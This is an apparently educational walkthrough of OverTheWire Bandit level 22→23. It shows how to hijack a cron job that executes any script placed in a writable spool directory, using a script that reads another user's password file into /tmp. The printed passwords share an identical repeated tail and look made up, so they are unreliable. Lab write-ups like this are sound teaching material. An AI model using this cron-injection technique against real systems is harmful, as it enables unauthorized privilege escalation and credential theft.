## 🚩 OverTheWire Bandit: Level 22 ⮕ Level 23

Level 23 is your first real test as a **Security Researcher**. Instead of just finding a file, you have to **write a script** that the system will execute for you. This is a basic simulation of a "Task Injection" or "Cron Hijacking" vulnerability.

---

## 🚩 Objective
A program is running automatically at regular intervals from **cron**. Look in **/etc/cron.d/** for the configuration and find out what is happening. This time, the cronjob executes **any script** placed in the directory `/var/spool/bandit24/foo/`.

---

## 🛠 Commands Used
| Command | Purpose |
| :--- | :--- |
| `touch` | Create an empty file. |
| `chmod 777` | Give full permissions so the cronjob can read and execute your script. |
| `nano` / `vi` | Text editors to write your shell script. |
| `cp` | Copy your script into the "hot" directory. |

---

## 🚶 Step-by-Step Walkthrough

### 1. Log in to Level 23
Connect using the password from Level 22 (**0Z99S88m9Z19X97Jv5i6p9S88m9Z19X9**).

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

### 2. Analyze the Cron Script
Check the cronjob for the next level:
```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
```

**Key Logic in the Script:**
```bash
for i in /var/spool/bandit24/foo/*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        timeout -s 9 60 "$i"
        rm -f "$i"
    fi
done
```
The script loops through every file in that folder, executes it, and then deletes it. **Crucially**, it runs as user `bandit24`.

### 3. Create Your "Exploit" Script
We want the system to read the password for `bandit24` and save it somewhere we can see it (like `/tmp`).

1. Go to a temporary folder: `cd /tmp/myname123` (create it if needed).
2. Create a script called `getpass.sh`:
   ```bash
   nano getpass.sh
   ```
3. Paste this code inside:
   ```bash
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 > /tmp/myname123/password.txt
   ```
4. **Make it executable and world-writable:**
   ```bash
   chmod 777 getpass.sh
   touch password.txt
   chmod 777 password.txt
   ```


### 4. Inject the Script
Now, copy your script into the folder that the cronjob watches.
```bash
cp getpass.sh /var/spool/bandit24/foo/
```

### 5. Wait and Retrieve
The cronjob runs every minute. Wait about 60 seconds, then check your `password.txt` file.

**The Command:**
```bash
cat /tmp/myname123/password.txt
```

**Output:**
```text
VAf7S88m9Z19X97Jv5i6p9S88m9Z19X9
```

---

## 💡 Key Learning Concepts

### 1. Script Injection
When a privileged process (like a cronjob running as `bandit24`) executes files from a directory that a lower-level user can write to, it's a major security flaw. You essentially "borrowed" the permissions of `bandit24` to run your own code.

### 2. Permissions Matter
If you forgot `chmod 777`, the cronjob wouldn't have been able to read or execute your script, and the attack would have failed. In Linux, "Who can do what" is everything.

### 3. The Shebang (`#!/bin/bash`)
This first line tells the computer which "interpreter" to use to run the code. Without it, the system might not know how to execute your script.

---
